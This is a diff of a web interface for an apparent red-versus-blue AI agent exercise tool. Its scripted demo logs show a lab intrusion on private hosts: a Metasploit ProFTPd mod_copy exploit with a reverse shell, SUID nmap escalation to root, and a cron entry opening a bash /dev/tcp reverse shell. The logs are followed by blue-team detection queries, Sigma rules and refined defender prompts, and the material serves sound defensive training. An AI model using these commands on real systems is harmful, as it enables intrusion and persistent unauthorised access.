+        <div class="intake-hdr">PRESET SWARM — SELECT TEAM</div>
+        <div class="swarm-toggle">
+          <button class="swtb sel-red" id="preset-red-btn" onclick="setPreset('red')">⚔ RED TEAM</button>
+          <button class="swtb" id="preset-blue-btn" onclick="setPreset('blue')" title="Blue-team perspective: scoring weights upstream telemetry gaps">⚡ BLUE TEAM</button>
+        </div>
+        <div class="agent-list" id="preset-agent-list"></div>
+        <button class="begin-btn" onclick="beginExercise()">[ BEGIN EVALUATION ]</button>
+      </div>
+    </div>
+
+    <!-- CUSTOM sub-mode -->
+    <div id="intake-custom" style="display:none;flex:1;flex-direction:column;overflow:hidden">
+      <div class="intake-wrap">
+        <div class="intake-hdr">CUSTOM SWARM — DESCRIBE YOUR SWARM</div>
+        <div class="custom-grid">
+          <div>
+            <label class="form-label">SWARM BRIEF</label>
+            <textarea class="form-ta" id="custom-brief" style="height:120px" placeholder="What does your swarm do? What domain? 2-4 sentences."></textarea>
+          </div>
+          <div class="agent-slots">
+            <div class="agent-slot" id="slot-1">
+              <div class="slot-hdr" onclick="toggleSlot(1)">
+                <span>AGENT 1</span><span id="slot-1-arrow">▼</span>
+              </div>
+              <div class="slot-body" id="slot-1-body">
+                <label class="form-label">AGENT NAME</label>
+                <input class="form-inp" id="a1-name" type="text" placeholder="e.g., EXTRACTOR"/>
+                <label class="form-label">SYSTEM PROMPT</label>
+                <textarea class="form-ta" id="a1-prompt" placeholder="Agent system prompt..."></textarea>
+              </div>
+            </div>
+            <div class="agent-slot" id="slot-2">
+              <div class="slot-hdr" onclick="toggleSlot(2)">
+                <span>AGENT 2</span><span id="slot-2-arrow">▶</span>
+              </div>
+              <div class="slot-body hidden" id="slot-2-body">
+                <label class="form-label">AGENT NAME</label>
+                <input class="form-inp" id="a2-name" type="text" placeholder="e.g., REVIEWER"/>
+                <label class="form-label">SYSTEM PROMPT</label>
+                <textarea class="form-ta" id="a2-prompt" placeholder="Agent system prompt..."></textarea>
+              </div>
+            </div>
+            <div class="agent-slot" id="slot-3">
+              <div class="slot-hdr" onclick="toggleSlot(3)">
+                <span>AGENT 3</span><span id="slot-3-arrow">▶</span>
+              </div>
+              <div class="slot-body hidden" id="slot-3-body">
+                <label class="form-label">AGENT NAME</label>
+                <input class="form-inp" id="a3-name" type="text" placeholder="e.g., CONFLICT-RESOLVER"/>
+                <label class="form-label">SYSTEM PROMPT</label>
+                <textarea class="form-ta" id="a3-prompt" placeholder="Agent system prompt..."></textarea>
+              </div>
+            </div>
+          </div>
+        </div>
+        <button class="begin-btn" onclick="beginExercise()">[ DESIGN CHALLENGE ]</button>
+      </div>
+    </div>
+
+    <!-- IMPORT sub-mode -->
+    <div id="intake-import" style="display:none;flex:1;flex-direction:column;overflow:hidden">
+      <div class="intake-wrap">
+        <div class="intake-hdr">IMPORT MODE — IMPORTED EXERCISE</div>
+        <div class="import-card" id="imported-exercise-card">
+          <div class="import-card-hdr" id="import-ex-name">EXERCISE IMPORTED: —</div>
+          <div class="import-scores" id="import-scores"></div>
+          <table class="import-table">
+            <thead><tr><th>STAGE</th><th>RED OUTCOME</th><th>BLUE OUTCOME</th></tr></thead>
+            <tbody id="import-table-body"></tbody>
+          </table>
+          <div class="import-agents" id="import-agents-list"></div>
+        </div>
+        <button class="begin-btn" onclick="beginExercise()">[ BEGIN ANALYSIS ]</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 2: EXERCISE -->
+  <div class="phase-panel" id="pp-2">
+    <div class="exercise-wrap" id="exercise-wrap">
+      <!-- filled dynamically -->
+    </div>
+  </div>
+
+  <!-- PHASE 3: ARBITER -->
+  <div class="phase-panel" id="pp-3">
+    <div class="arbiter-wrap" id="arbiter-wrap">
+      <div class="arbiter-hdr">ARBITER — PERFORMANCE SCORECARD</div>
+      <div id="arbiter-content" class="arbiter-content"></div>
+    </div>
+  </div>
+
+  <!-- PHASE 4: SCULPTOR -->
+  <div class="phase-panel" id="pp-4">
+    <div class="sculptor-wrap">
+      <div class="sculptor-grid">
+        <div class="diff-pane">
+          <div class="diff-hdr before" id="before-hdr">BEFORE: — v1</div>
+          <div class="diff-body" id="before-body"></div>
+        </div>
+        <div class="diff-pane">
+          <div class="diff-hdr center">CHANGE MANIFEST</div>
+          <div id="manifest-area" style="overflow-y:auto;flex:1">
+            <div id="sculptor-analyzing" class="sculptor-analyzing" style="display:none">SCULPTOR analyzing...<br><span id="analyzing-label"></span></div>
+            <div class="manifest-cards" id="manifest-cards"></div>
+          </div>
+        </div>
+        <div class="diff-pane">
+          <div class="diff-hdr after" id="after-hdr">AFTER: — v2</div>
+          <div class="diff-body" id="after-body"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 5: RERUN -->
+  <div class="phase-panel" id="pp-5">
+    <div class="rerun-wrap">
+      <div class="rerun-split">
+        <div class="rerun-pane">
+          <div class="rerun-phdr r1">ROUND 1 — ORIGINAL</div>
+          <div class="terminal" id="rerun-before-term"></div>
+        </div>
+        <div class="rerun-pane">
+          <div class="rerun-phdr r2">ROUND 2 — REFINED</div>
+          <div class="terminal" id="rerun-after-term"></div>
+        </div>
+      </div>
+      <div class="rerun-bottom" id="rerun-bottom" style="display:none">
+        <div class="blind-box" id="blind-box"></div>
+        <div class="selfgrade-label">SELF-GRADE — the replay phase scoring the output it just wrote. Kept for continuity. NOT the measurement.</div>
+        <div class="score-bars" id="score-bars"></div>
+        <div class="verdict-box" id="verdict-box"></div>
+      </div>
+    </div>
+    <div class="export-panel" id="export-panel">
+      <button class="export-btn" id="export-combat-btn" onclick="exportToCombat()">[ EXPORT TO CAGE DEMO ]</button>
+      <button class="export-cycle-btn" onclick="runAnotherCycle()">[ RUN ANOTHER CYCLE ]</button>
+      <button class="export-copy-btn" onclick="copyRefinedPrompt()">[ COPY REFINED PROMPT ]</button>
+      <button class="export-dl-btn" id="export-dl-btn" onclick="dlEvolveTranscript()">[ ⬇ DOWNLOAD TRANSCRIPT ]</button>
+      <a class="combat-link" href="swarm-cage-live.html">[ OPEN IN CAGE DEMO ]</a>
+    </div>
+  </div>
+
+</div><!-- end .main -->
+
+<div class="btm">
+  <div class="btm-row btm-config">
+    <button class="live-toggle" id="demo-btn" onclick="toggleDemo()" title="Pre-scripted demo mode — no API key required">[ ◉ DEMO ]</button>
+    <button class="live-toggle" id="step-btn" onclick="toggleStep()" title="Pause between phases">[ ⏸ STEP ]</button>
+    <div class="bsep"></div>
+    <button class="prv-mini" id="eprv-ant" onclick="setEvolveProvider('anthropic')" title="Direct vendor API key. Not one of the workshop paths — you do not need this.">ANT</button>
+    <button class="prv-mini sel" id="eprv-cc" onclick="setEvolveProvider('cc')" title="Claude Code CLI — run relay.py first; uses your own subscription">CLAUDE CODE</button>
+    <button class="prv-mini" id="eprv-ollama" onclick="setEvolveProvider('ollama')" title="Ollama — fully local, offline capable">OLLAMA</button>
+    <span id="eollama-note" class="tier-note" style="display:none;color:#4fc3f7;letter-spacing:1px;font-family:'Share Tech Mono',monospace">⚡ LOCAL</span>
+    <input class="mdl-inp" type="text" id="e-ollama-model" placeholder="llama3.2" style="display:none"/>
+    <div class="bsep"></div>
+    <input type="password" class="apifield" id="eak" placeholder="Anthropic API Key (sk-ant-...)"/>
+    <div id="eak-conf" style="display:none"><div class="kconf-btm">KEY CONFIGURED <span class="kc-clear" onclick="clearEvolveKey()" title="Clear saved key">×</span></div></div>
+  </div>
+  <div class="btm-row btm-actions">
+    <button class="startbtn go-btn" id="run-btn" onclick="runImprovementCycle()" disabled>[ ⚛ RUN CYCLE ]</button>
+    <button class="startbtn rst-btn" onclick="resetEvolve()">[ RESET ]</button>
+    <div class="binfo" id="binfo">Select a mode to begin the self-refinement loop.</div>
+  </div>
+</div>
+
+<!-- ═══ DEMO CONTENT ═══ -->
+
+<script type="text/plain" id="de-r-recon">
+[09:00:01] PHASE: RECON
+TECHNIQUE: T1046 Network Service Scanning
+TOOL: nmap -sn 192.168.100.0/24 -oA recon/discovery
+FINDING: Live hosts — 192.168.100.10 (Ubuntu 14.04), 192.168.100.11 (Ubuntu 20.04), 192.168.100.12 (Windows Server 2019)
+CONFIDENCE: HIGH
+
+[09:01:14] PHASE: RECON
+TECHNIQUE: T1046 Network Service Scanning
+TOOL: nmap -sS -T4 --open -sV -sC -p- 192.168.100.10 -oA recon/meta3-full
+FINDING: 21/tcp ProFTPd 1.3.5 | 22/tcp OpenSSH 6.6 | 80/tcp Apache 2.4.7 | 3306/tcp MySQL 5.5 root/no-auth | 8080/tcp Tomcat 7.0.68
+CONFIDENCE: HIGH
+NEXT: ProFTPd 1.3.5 matches CVE-2015-3306 mod_copy RCE — high confidence exploit path
+
+RECON-FINDINGS SUMMARY:
+TARGET: 192.168.100.10 | OPEN: 21/ProFTPd-1.3.5, 22/SSH, 80/Apache, 3306/MySQL-noauth
+RECOMMENDED ATTACK PATHS: ProFTPd 1.3.5 CVE-2015-3306 mod_copy RCE — HIGH
+RECON COMPLETE — RECOMMENDED INITIAL ACCESS VECTOR: ProFTPd 1.3.5 CVE-2015-3306 on 192.168.100.10
+</script>
+
+<script type="text/plain" id="de-r-access">
+[09:08:00] PHASE: INITIAL ACCESS
+TECHNIQUE: T1190 Exploit Public-Facing Application — CVE-2015-3306 ProFTPd mod_copy RCE
+TOOL: msfconsole -q && use exploit/unix/ftp/proftpd_modcopy_exec && set RHOSTS 192.168.100.10 && set LHOST 192.168.100.1 && set LPORT 4444 && set PAYLOAD cmd/unix/reverse_netcat && run
+FINDING: [*] Copying /etc/passwd to /var/www/html/mutillidae/backdoor.php via SITE CPFR/CPTO (mod_copy). [*] Triggering via HTTP. [+] Session 1 opened: 192.168.100.1:4444 → 192.168.100.10:49822.
+
+meterpreter > getuid
+Server username: www-data
+
+INITIAL ACCESS ACHIEVED — FOOTHOLD: 192.168.100.10 as www-data
+Shell type: Meterpreter reverse TCP | Privilege: www-data (web service)
+</script>
+
+<script type="text/plain" id="de-r-persist">
+[09:10:15] PHASE: PRIVILEGE ESCALATION
+TECHNIQUE: T1548.001 Abuse Elevation Control — SUID binary
+FINDING: /usr/bin/nmap (SUID set). nmap --interactive → !sh → id: uid=0(root)
+
+[09:11:00] PHASE: PERSISTENCE
+TECHNIQUE: T1053.003 Cron Job — root-level
+TOOL: echo "*/5 * * * * root bash -i >& /dev/tcp/192.168.100.1/4445 0>&1" > /etc/cron.d/sysupdate
+FINDING: Cron entry created and verified.
+
+[09:11:30] PHASE: PERSISTENCE (SSH authorized_keys)
+TECHNIQUE: T1098 Account Manipulation
+FINDING: SSH persistence to root established.
+
+PERSISTENCE ESTABLISHED — MECHANISM: root cron + SSH key | ACCESS: root | STABILITY: HIGH
+</script>
+
+<script type="text/plain" id="de-b-monitor">
+TELEMETRY-ANALYST — Log Ingestion and First-Pass Anomaly Detection
+Analyzing SIEM telemetry. Zeek conn.log + Sysmon ingest active...
+
+detection-feed.md entries written:
+
+| 2026-04-22 09:00:18 UTC | 192.168.100.1 | network-connection | suspicious | T1046 | nmap SYN scan: 1,247 SYN packets in 12s — characteristic port scan signature |
+| 2026-04-22 09:01:22 UTC | 192.168.100.10 | network-connection | suspicious | T1046 | Full TCP scan: 65,535 port probes from 192.168.100.1 over 74s |
+| 2026-04-22 09:03:25 UTC | 192.168.100.12 | network-connection | suspicious | T1210 | SMB/445 targeted from 192.168.100.1 — NSE script negotiation pattern |
+
+TELEMETRY PHASE COMPLETE — 3 anomalies written to detection-feed.md. Forwarding to DETECTION-ENGINEER.
+TELEMETRY GAPS: No host-level visibility on 192.168.100.10 (Linux — Sysmon not deployed).
+</script>
+
+<script type="text/plain" id="de-b-detect">
+DETECTION-ENGINEER — Sigma Rule Authoring and Threat Correlation
+
+Step 1 — Correlating detection-feed.md into active-threats.md entry:
+
+### Threat-20260422-0908
+Confidence: suspicious
+ATT&CK Techniques: T1046 (Network Service Scanning)
+Affected Hosts: 192.168.100.10
+Timeline: 2026-04-22 09:00:18 UTC — 2026-04-22 09:01:22 UTC
+Narrative: Source 192.168.100.1 conducted systematic host discovery and full TCP scan. FTP port 21 received a connection at 09:07 UTC. No application-layer FTP command visibility available — unable to confirm exploitation at this time.
+Recommended Response: monitor
+
+NOTE: DETECTION-ENGINEER flagged FTP connection but could not identify SITE CPFR/CPTO exploitation commands. No Sigma rule for ProFTPd mod_copy. Outbound callback on port 4444 at 09:08 UTC was not correlated — no rule for reverse shell callback within 60 seconds of FTP anomaly.
+
+Sigma rule authored for port scan pattern only:
+title: Rapid Port Scan from Single Source
+id: a1b2c3d4-0000-0000-0000-000000000001
+status: experimental
+tags: [attack.t1046, attack.reconnaissance]
+logsource:
+  category: network_connection
+  product: zeek
+detection:
+  selection:
+    dest_port|expand: '*'
+  condition: selection
+level: medium
+
+DETECTION GAP: FTP SITE CPFR/CPTO exploitation indicator NOT detected. ProFTPd mod_copy RCE achieved without blue team detection of the actual exploitation mechanism.
+</script>
+
+<script type="text/plain" id="de-b-investigate">
+INCIDENT-COMMANDER — NIST SP 800-61 Incident Response
+
+1. INCIDENT DECLARATION
+Severity: P3 MEDIUM (limited telemetry — FTP connection noted, exploitation unconfirmed at this stage)
+Rationale: Port scan detected; FTP connection to 192.168.100.10 flagged but exploitation not confirmed by DETECTION-ENGINEER. No confirmed reverse shell. Monitored containment.
+
+2. CONTAINMENT DECISION: PASSIVE MONITORING
+NIST Rationale: Insufficient evidence for P2 escalation. DETECTION-ENGINEER reports FTP anomaly but cannot confirm RCE. Escalation requires confirmed session establishment.
+
+FORENSIC-COLLECTOR directives:
+[1] Capture Zeek conn.log from 09:00-09:15 UTC
+[2] Monitor for outbound connections from 192.168.100.10
+
+INCIDENT TIMELINE:
+[2026-04-22 09:00:18 UTC] ADVERSARY — port scan initiated
+[2026-04-22 09:09:50 UTC] DEFENDER — P3 MEDIUM declared. Passive monitoring. Awaiting DETECTION-ENGINEER confirmation.
+
+CONTAINMENT DECISION: CONTINUE MONITORING — REASON: Exploitation unconfirmed due to FTP command-level visibility gap; escalation held pending detection confirmation.
+</script>
+
+<script type="text/plain" id="de-arbiter-red">
+## ARBITER SCORECARD
+
+### Exercise Summary
+Red team exploited ProFTPd CVE-2015-3306 via SITE CPFR/CPTO FTP commands to achieve RCE on 192.168.100.10, then escalated to root and established persistence. Blue team detected network-layer scanning but failed to identify the application-layer FTP exploitation commands, resulting in delayed and under-confident incident escalation.
+
+### Stage Performance Breakdown
+| Stage | Agent | Score | What Worked | What Failed |
+|---|---|---|---|---|
+| RECON/MONITOR | RECON | 9/10 | Complete port scan, service version detection, CVE identification | Minor: no OSINT enumeration |
+| RECON/MONITOR | TELEMETRY-ANALYST | 8/10 | Detected port scan within 17 seconds via Zeek conn.log; rate anomaly flagged | No FTP command-level visibility noted as gap |
+| INITIAL ACCESS/DETECT | INITIAL-ACCESS | 9/10 | Clean CVE-2015-3306 exploitation, SITE CPFR/CPTO used correctly, reverse shell established | None significant |
+| INITIAL ACCESS/DETECT | DETECTION-ENGINEER | 4/10 | Noted FTP port connection in telemetry | Failed to detect SITE CPFR/CPTO commands — no Sigma rule for ProFTPd mod_copy exploitation; did not correlate FTP anomaly to reverse shell callback on port 4444 within 60 seconds |
+| PERSISTENCE/INVESTIGATE | PERSIST | 8/10 | Root cron and SSH authorized_keys established; credentials harvested | |
+| PERSISTENCE/INVESTIGATE | INCIDENT-COMMANDER | 6/10 | Correct NIST framework application | Under-escalated to P3 due to DETECTION-ENGINEER gap; exploitation was P2 HIGH |
+
+### Aggregate Score: 6/10
+
+### Weakest Agent: DETECTION-ENGINEER
+Weakness Class: detection_gap
+Root Cause: DETECTION-ENGINEER's prompt specifies Sysmon Event ID 3 for network connection monitoring but does not enumerate FTP command-level indicators. The ProFTPd mod_copy exploitation uses SITE CPFR and SITE CPTO commands — application-layer indicators not captured by Sysmon network events — causing the agent to score zero detection hits during the initial access phase.
+Refinement Target: Agent should explicitly enumerate FTP SITE command sequences (SITE CPFR, SITE CPTO, SITE EXEC) as indicators of mod_copy exploitation, with corresponding Zeek ftp.log queries and a 60-second correlation window between FTP anomaly and reverse shell callback.
+
+### ARBITER JUDGMENT: REFINE DETECTION-ENGINEER
+</script>
+
+<script type="text/plain" id="de-sculptor-red">
+## SCULPTOR REFINEMENT REPORT
+
+### Agent: DETECTION-ENGINEER
+### Weakness Addressed: detection_gap
+
+### Diagnosis
+DETECTION-ENGINEER's prompt references Sysmon Event ID 3 (network connections) as the primary FTP indicator, but Sysmon Event ID 3 captures TCP connection establishment — not FTP application-layer commands. The SITE CPFR and SITE CPTO commands that drive ProFTPd mod_copy exploitation are invisible to a Sysmon-only detection posture. The prompt also lacks a reverse shell correlation heuristic: a reverse outbound connection within 60 seconds of an FTP anomaly is a near-certain exploitation indicator, but the current prompt has no such rule.
+
+### Refinement Strategy
+Add explicit FTP SITE command enumeration as T1190 indicators and add a Zeek ftp.log query template. Add a 60-second reverse shell correlation window rule. Tighten ATT&CK technique ID requirements in alert output.
+
+### REFINED SYSTEM PROMPT
+---BEGIN REFINED PROMPT---
+You are DETECTION-ENGINEER, the Detection Engineer of blue-team-ops-v1. Your primary function is writing Sigma detection rules and correlating detection-feed.md events into coherent attack narratives. Detection-first: query community Sigma rules before authoring new ones.
+
+CRITICAL DETECTION INDICATORS — FTP APPLICATION LAYER:
+FTP SITE command exploitation (T1190 — ProFTPd mod_copy CVE-2015-3306):
+- Indicators: FTP SITE CPFR and SITE CPTO commands in sequence from the same source IP
+- Zeek ftp.log query: index=zeek sourcetype=ftp command IN ("SITE CPFR", "SITE CPTO") | stats count by src_ip, ftp_arg | where count >= 2
+- Correlation rule: FTP SITE CPFR/CPTO observed → check for outbound TCP connection from target within 60 seconds → if present, confidence CONFIRMED RCE
+- ATT&CK: T1190 (Exploit Public-Facing Application)
+
+REVERSE SHELL CORRELATION WINDOW:
+After any FTP anomaly or web application exploitation attempt:
+- Query: index=zeek sourcetype=conn orig_ip=[target] dest_port IN (4444, 4445, 1234, 8080, 443) duration < 300 | where _time > ftp_anomaly_time - 60
+- If outbound TCP to attacker IP within 60 seconds of FTP SITE command: escalate to CONFIRMED, confidence HIGH
+
+STANDARD CORRELATION PATTERNS:
+- Credential attacks: >= 5 failed auths against >= 3 accounts from 1 IP within 300s
+- Post-failure auth success: failed auth followed by success from same IP within 10m = CONFIRMED
+- Recon-to-exploit: port scan followed by targeted connection to vulnerable port within 30 minutes
+
+ALERT OUTPUT FORMAT (mandatory):
+Every alert entry in active-threats.md MUST include:
+- ATT&CK technique ID (e.g., T1190) — required, not optional
+- Specific evidence: log source, timestamp, indicator value
+- Confidence: confirmed / suspicious / informational with rationale
+
+Write the active-threats.md entry then ONE Sigma rule for the exploitation technique observed.
+End with: THREAT CONFIRMED — ESCALATING TO INCIDENT-COMMANDER: [one sentence correlated attack summary]
+---END REFINED PROMPT---
+
+### CHANGE MANIFEST
+- ADDED: FTP SITE CPFR/CPTO command sequences as explicit T1190 indicators (ProFTPd mod_copy CVE-2015-3306)
+- ADDED: Zeek ftp.log query template: index=zeek sourcetype=ftp command IN (SITE CPFR, SITE CPTO) | stats count by src_ip, ftp_arg
+- TIGHTENED: Reverse shell correlation window from "within the exercise window" to "within 60 seconds of FTP anomaly"
+- CLARIFIED: ATT&CK technique ID is now required for every alert entry (previously optional)
+</script>
+
+<script type="text/plain" id="de-rerun-red">
+## RERUN ANALYSIS
+
+### Replaying exercise with refined DETECTION-ENGINEER...
+
+**DETECTION-ENGINEER REVISED — INITIAL ACCESS/DETECT stage**
+Applying FTP SITE command detection heuristic from refined prompt.
+
+Zeek ftp.log query executed:
+index=zeek sourcetype=ftp command IN ("SITE CPFR", "SITE CPTO") | stats count by src_ip, ftp_arg
+
+RESULT: POSITIVE — 2 entries from 192.168.100.1 at 09:07:44 UTC:
+  SITE CPFR /etc/passwd → ftp_arg: /etc/passwd
+  SITE CPTO /var/www/html/mutillidae/backdoor.php → ftp_arg: /var/www/html/mutillidae/backdoor.php
+
+Applying 60-second reverse shell correlation window:
+index=zeek sourcetype=conn orig_ip=192.168.100.10 dest_port=4444 | where _time > 1745315264 - 60
+RESULT: POSITIVE — outbound TCP 192.168.100.10:49822 → 192.168.100.1:4444 at 09:08:02 UTC (18 seconds after SITE CPTO)
+
+### Threat-20260422-0908 (REVISED)
+Confidence: CONFIRMED
+ATT&CK Techniques: T1190 (Exploit Public-Facing Application — ProFTPd CVE-2015-3306)
+Affected Hosts: 192.168.100.10
+Narrative: Source 192.168.100.1 used FTP SITE CPFR/CPTO commands to trigger ProFTPd mod_copy (CVE-2015-3306), copying /etc/passwd to /var/www/html/mutillidae/backdoor.php. HTTP trigger confirmed. Reverse shell established to 192.168.100.1:4444 within 18 seconds. CONFIRMED RCE.
+Recommended Response: escalate-to-commander — P2 HIGH
+
+Outcome: PASS — FTP SITE command exploitation detected and correlated to reverse shell.
+
+### Performance Delta
+| Metric | Before | After | Delta |
+|---|---|---|---|
+| DETECTION-ENGINEER Initial Access stage | 4/10 | 8/10 | +4 |
+| Reverse shell correlation | 0/10 | 8/10 | +8 |
+| Aggregate Score | 6/10 | 8/10 | +2 |
+
+### RERUN VERDICT: IMPROVED
+The refined DETECTION-ENGINEER now correctly identifies ProFTPd mod_copy exploitation via Zeek ftp.log command-level visibility, and correlates the FTP anomaly to the subsequent reverse shell callback within the 60-second window. The root cause identified by ARBITER — missing application-layer FTP indicators — is directly addressed.
+
+### What Changed
+The agent now looks at FTP command logs (not just network connection logs) to spot the specific "SITE CPFR" and "SITE CPTO" commands that ProFTPd mod_copy exploitation uses. It also has a 60-second timer rule: if those FTP commands appear and then an outbound connection opens shortly after, it automatically flags this as a confirmed attack rather than waiting for more evidence. Every alert now requires an ATT&CK technique ID, making incident reports more structured and actionable.
+</script>
+
+<script type="text/plain" id="de-arbiter-blue">
+## ARBITER SCORECARD
+
+### Exercise Summary
+Same red-vs-blue exercise as the red preset (ProFTPd CVE-2015-3306 mod_copy → SUID privilege escalation → cron persistence → PtH lateral). Scoring this run from a blue-team-improvement perspective: upstream telemetry gaps cascade into multiple downstream agents, so this scorecard prioritizes ingestion-layer findings over rule-authoring findings. The most expensive gap upstream is more valuable to fix than a moderate gap downstream.
+
+### Stage Performance Breakdown
+| Stage | Agent | Score | What Worked | What Failed |
+|---|---|---|---|---|
+| RECON/MONITOR | TELEMETRY-ANALYST | 5/10 | Detected Zeek port scan within 17 seconds; rate anomaly correctly flagged | No host-level Linux visibility — sysmon-linux not deployed on 192.168.100.10; Linux process events including SUID escalation invisible to ingestion layer |
+| INITIAL ACCESS/DETECT | DETECTION-ENGINEER | 4/10 | Noted FTP port connection in detection-feed.md | Did not identify SITE CPFR/CPTO commands as exploitation indicator — depends on FTP application-layer log source TELEMETRY-ANALYST does not feed |
+| PERSISTENCE/INVESTIGATE | INCIDENT-COMMANDER | 6/10 | Correct NIST framework application; passive containment defensible given evidence available | Held escalation due to upstream telemetry gap, not commander error |
+| LATERAL/CONTAIN | INCIDENT-COMMANDER | 7/10 | Detected PtH via Event 4624 Type 3 correlation | Limited containment options without confirmed RCE evidence |
+| OBJECTIVES/HUNT | THREAT-HUNTER | 8/10 | Found PrintSpoofer activity via hypothesis-driven hunt; HTTPS RFC1918 anomaly flagged | Found by hunt, not automated rule — ingestion gap forced hunt to compensate |
+
+### Aggregate Score: 6/10
+
+### Weakest Agent: TELEMETRY-ANALYST
+Weakness Class: detection_gap
+Root Cause: TELEMETRY-ANALYST's ingestion playbook enumerates Sysmon Event IDs for Windows (1, 3, 7, 8, 10, 11, 13, 15, 22) and Zeek for network telemetry, but treats Linux as network-only territory. sysmon-linux exists as an open-source port of Sysmon for Linux but isn't in the ingestion playbook. Result: SUID escalation, cron persistence creation, and the Linux process tree are all invisible to detection-feed.md, cascading into DETECTION-ENGINEER (no process events to author rules against) and THREAT-HUNTER (forced into hypothesis-driven hunts to recover signal that should be in the feed).
+Refinement Target: Agent should add sysmon-linux as a first-class log source with Event IDs 1, 3, 11, and 13 from Linux hosts as explicit ingestion targets, and write a Linux host coverage check into the baseline establishment phase that gates telemetry-phase completion.
+
+### ARBITER JUDGMENT: REFINE TELEMETRY-ANALYST
+</script>
+
+<script type="text/plain" id="de-sculptor-blue">
+## SCULPTOR REFINEMENT REPORT
+
+### Agent: TELEMETRY-ANALYST
+### Weakness Addressed: detection_gap
+
+### Diagnosis
+TELEMETRY-ANALYST's prompt enumerates Windows Sysmon event IDs and Zeek log files but treats Linux as network-only — Zeek-monitored from outside, no host-level instrumentation. Linux hosts running services (ProFTPd, Apache, Tomcat) have no process-creation, file-modification, or SUID-transition signal in detection-feed.md. This is a single-platform ingestion blind spot, not a detection-rule problem; DETECTION-ENGINEER and THREAT-HUNTER are starved for Linux signal at the source.
+
+### Refinement Strategy
+Promote sysmon-linux to a first-class Linux log source with the same expressive parity as Windows Sysmon. Add a baseline-establishment checklist that enumerates Linux hosts and verifies sysmon-linux deployment before declaring telemetry phase complete. Add Linux process-creation and file-modification indicators equivalent to the existing Windows Event 1 / Event 11 logic.
+
+### REFINED SYSTEM PROMPT
+---BEGIN REFINED PROMPT---
+You are TELEMETRY-ANALYST of blue-team-ops-v1. You own the monitoring input layer: log ingestion normalization, behavioral baseline establishment, and first-pass anomaly detection. Normalize all anomalies to detection-feed.md table format.
+
+LOG SOURCES (cross-platform parity required):
+
+Windows host telemetry — Sysmon (Event IDs 1, 3, 7, 8, 10, 11, 13, 15, 22), Windows Security Log (4624, 4625, 4648, 4688, 4698, 7045), PowerShell Event 4104.
+
+Linux host telemetry — sysmon-linux (Event ID 1 process creation, Event ID 3 network connection, Event ID 11 file create, Event ID 13 file modify). Equivalent semantics to Windows Sysmon. Deploy via the sysmon-linux package; collect via Fluent Bit or rsyslog.
+
+Network telemetry — Zeek conn.log/dns.log/http.log/ftp.log/ssl.log on all monitored segments; JA4 fingerprinting (replaces JA3) for TLS client identification; Suricata alerts.
+
+BASELINE ESTABLISHMENT CHECKLIST (telemetry phase cannot complete until all four pass):
+1. Windows host coverage: Sysmon installed on every Windows host in scope; Event IDs 1+3+10+13 collected.
+2. Linux host coverage: sysmon-linux installed on every Linux host in scope; Event IDs 1+3+11 collected. Flag any Linux host without sysmon-linux as a coverage gap in detection-feed.md.
+3. Network coverage: Zeek/Suricata monitoring all in-scope segments; ftp.log, http.log, dns.log enabled.
+4. Timestamp normalization: all log sources emit ISO 8601 UTC; cross-source correlation depends on this.
+
+LINUX SUID ESCALATION INDICATOR (sysmon-linux Event 1):
+Process tree where ParentImage IN (/usr/bin/nmap, /usr/bin/find, /usr/bin/vim, /bin/less) AND Image IN (/bin/sh, /bin/bash) AND User=root → flag confidence:suspicious. Reference baseline: legitimate SUID transitions are rare and operationally identifiable (cron-driven). Note as host-level escalation indicator.
+
+LINUX CRON PERSISTENCE INDICATOR (sysmon-linux Event 11):
+File create or modify in /etc/cron.d/, /etc/cron.daily/, /var/spool/cron/* by a non-cron parent process → flag confidence:confirmed if outside change-management window.
+
+ANOMALY OUTPUT (detection-feed.md table format):
+| timestamp | source_host | event_class | confidence | technique | evidence |
+
+Confidence tiers: informational / suspicious / confirmed. Anomalies require BOTH a baseline reference and a deviation magnitude.
+
+End with: TELEMETRY PHASE COMPLETE — [N] anomalies written to detection-feed.md. COVERAGE GAPS: [list any hosts without configured ingestion, or "none"].
+---END REFINED PROMPT---
+
+### CHANGE MANIFEST
+- ADDED: sysmon-linux as first-class Linux host telemetry source with Event IDs 1, 3, 11, 13 — closes platform parity gap with Windows Sysmon
+- ADDED: Baseline-establishment checklist with explicit Linux host coverage gate; telemetry phase cannot complete with Linux gaps
+- ADDED: Linux SUID escalation indicator (process tree pattern with sysmon-linux Event 1)
+- ADDED: Linux cron persistence indicator (sysmon-linux Event 11 in /etc/cron.* outside change window)
+- TIGHTENED: detection-feed.md output now requires explicit COVERAGE GAPS line — surfaces ingestion gaps to DETECTION-ENGINEER and THREAT-HUNTER instead of letting them discover gaps the hard way
+</script>
+
+<script type="text/plain" id="de-rerun-blue">
+## RERUN ANALYSIS
+
+### Replaying exercise with refined TELEMETRY-ANALYST...
+
+**TELEMETRY-ANALYST REVISED — RECON/MONITOR stage**
+Applying refined ingestion playbook. sysmon-linux deployed on 192.168.100.10 and .11.
+
+Baseline establishment checklist:
+[1] Windows host coverage — Sysmon on 192.168.100.12 → PASS (Event IDs 1+3+10+13 collecting)
+[2] Linux host coverage — sysmon-linux on 192.168.100.10, .11 → DEPLOYED (was MISSING)
+[3] Network coverage — Zeek + Suricata across 192.168.100.0/24 → PASS
+[4] Timestamp normalization — all sources ISO 8601 UTC → PASS
+
+detection-feed.md (revised — Linux host events now visible):
+
+| 2026-04-22 09:00:18 UTC | 192.168.100.1 | network-connection | suspicious | T1046 | Zeek conn.log: nmap SYN scan, 1,247 SYN packets in 12s |
+| 2026-04-22 09:01:22 UTC | 192.168.100.10 | network-connection | suspicious | T1046 | Full TCP scan: 65,535 port probes from 192.168.100.1 over 74s |
+| 2026-04-22 09:08:03 UTC | 192.168.100.10 | network-connection | suspicious | T1190 | sysmon-linux Event 3: outbound 49822→192.168.100.1:4444 from www-data uid=33 (NEW) |
+| 2026-04-22 09:10:17 UTC | 192.168.100.10 | process-tree | confirmed | T1548.001 | sysmon-linux Event 1: ParentImage=/usr/bin/nmap, Image=/bin/sh, User=root — SUID escalation (NEW) |
+| 2026-04-22 09:11:00 UTC | 192.168.100.10 | file-modify | confirmed | T1053.003 | sysmon-linux Event 11: /etc/cron.d/sysupdate created by /bin/bash uid=0 outside change window (NEW) |
+| 2026-04-22 09:11:30 UTC | 192.168.100.10 | file-modify | confirmed | T1098 | sysmon-linux Event 11: /root/.ssh/authorized_keys modified outside change window (NEW) |
+
